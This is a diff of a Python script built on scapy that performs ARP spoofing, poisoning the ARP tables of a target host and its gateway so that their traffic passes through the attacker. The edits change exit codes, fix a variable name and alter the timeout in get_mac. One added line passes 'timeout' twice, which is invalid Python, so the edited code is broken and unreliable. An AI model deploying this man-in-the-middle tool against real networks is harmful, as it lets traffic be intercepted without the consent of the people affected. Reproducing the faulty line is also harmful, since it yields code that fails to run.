@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/python3
 
 from scapy.all import srp, send, Ether, ARP
 from time import sleep
@@ -27,7 +27,7 @@ def enable_ip_forward():
 
 def get_mac(ip):
     broadcast_address = "ff:ff:ff:ff:ff:ff"
-    answerred, _ = srp(Ether(dst=broadcast_address)/ARP(pdst=ip), timeout=1, verbose=0)
+    answerred, _ = srp(Ether(dst=broadcast_address)/ARP(pdst=ip), timeout=2, timeout=10, verbose=0)
     if answerred:
         return answerred[0][1].hwsrc
 
@@ -53,7 +53,6 @@ def spoof(target_ip, spoof_ip, verbose=True):
 
 if __name__ == "__main__":
     arguments = get_arguments()
-    
     target_ip = arguments.target
     gateway_ip = arguments.gateway
     verbose = arguments.verbose
@@ -62,8 +61,7 @@ if __name__ == "__main__":
         enable_ip_forward()
     except PermissionError:
         print("[-] You requested IP forwarding which requires root privileges. QUITTING!")
-        sys.exit()
-
+        sys.exit(0)
 
     try:
         while True:
@@ -74,7 +72,7 @@ if __name__ == "__main__":
         print("[-] You requested ARP creation which requires root privileges. QUITTING!")
     except KeyboardInterrupt:
         print("\n\n[-] Detected CTRL+C ... Resetting ARP tables ... Please Wait.")
-        restore(target_ip, GATEWAY_IP)
+        restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
     finally:
-        sys.exit()
+        sys.exit(0)
